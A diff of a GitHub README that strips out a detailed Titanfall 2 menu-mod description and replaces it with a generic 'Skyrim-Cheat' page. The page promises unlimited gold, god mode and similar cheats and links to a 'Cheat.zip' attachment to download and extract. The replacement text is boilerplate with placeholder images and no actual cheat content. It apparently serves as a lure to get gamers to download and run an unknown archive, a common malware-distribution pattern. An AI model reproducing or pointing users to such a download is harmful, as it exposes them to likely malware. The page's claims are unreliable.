@@ -1,120 +1,74 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Skyrim-Cheat
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the Skyrim Cheat repository! This repository contains cheats and hacks for the popular game *The Elder Scrolls V: Skyrim*. Explore the content, utilize the cheats, and enhance your Skyrim gaming experience like never before.
 
+## Table of Contents
+- [Introduction](#introduction)
+- [Installation](#installation)
+- [Features](#features)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Introduction
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+Skyrim is a vast and immersive game, offering players a chance to explore a beautifully crafted world filled with dragons, magic, and adventure. However, sometimes you may want to bend the rules a bit or enhance your gameplay with some additional features. That's where **Skyrim Cheat** comes in handy!
+
+This repository provides a collection of cheats and hacks specifically designed for Skyrim. Whether you want unlimited gold, god mode, or any other in-game advantage, you'll find it here.
+
+![Skyrim Cheat](https://example.com/skyrim-cheat.png)
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To get started with **Skyrim Cheat**, follow these simple steps:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+1. Download the cheat package from the following link: [Download Cheat](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-## Icepick
+2. Extract the downloaded ZIP file to a location of your choice on your computer.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+3. Navigate to the extracted folder and choose the cheat file that corresponds to the feature you want to apply.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+4. Follow the specific instructions provided within each cheat file to activate the cheat in your Skyrim game.
 
-3) Launch Icepick.
+## Features
 
-## Northstar
+The **Skyrim Cheat** repository offers a range of features to enhance your gameplay experience. Some of the key features include:
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+- Unlimited Gold Cheat
+- God Mode Cheat
+- Instant Level Up Cheat
+- Item Duplication Cheat
+- Fast Travel Anywhere Cheat
+- Unlock All Skills Cheat
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+![Skyrim Cheats](https://example.com/skyrim-cheats.png)
 
-3) Launch Northstar.
+## Usage
 
-## Screenshots
+Using the cheats provided in this repository is simple and straightforward. Once you have downloaded and extracted the cheat package, follow the instructions included in each cheat file to activate the desired cheat in your Skyrim game.
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+Please note that some cheats may impact the balance of the game or prevent you from earning achievements. Use them responsibly and at your own discretion.
 
-Main Menu with the original Titanfall 2 menu video
+## Contributing
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+Contributions to the **Skyrim Cheat** repository are welcome! If you have additional cheats, hacks, or improvements to existing cheats, feel free to submit a pull request. Your contributions can help make Skyrim Cheat even more robust and enjoyable for all users.
 
-Main Menu with the showcase removed to declutter the menu
+To contribute, follow these steps:
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+1. Fork the repository to your GitHub account.
 
-New Cheat options that can be enabled as well as the extras menu
+2. Make your desired changes or additions.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+3. Submit a pull request with a clear description of your changes.
 
-Added keybinds for speedrunners and extra commands for fun
+4. Your pull request will be reviewed, and if accepted, merged into the main repository.
 
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
+Let's work together to make Skyrim Cheat the ultimate cheat resource for Skyrim players!
 
-Shows the values for each setting on the Advanced Look Options
+## License
 
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
+The **Skyrim Cheat** repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the cheats provided here in accordance with the terms of the license.
 
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
+---
 
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Thank you for visiting the Skyrim Cheat repository. Enjoy using the cheats and exploring the limitless possibilities they offer in the world of Skyrim! 🐉✨🎮
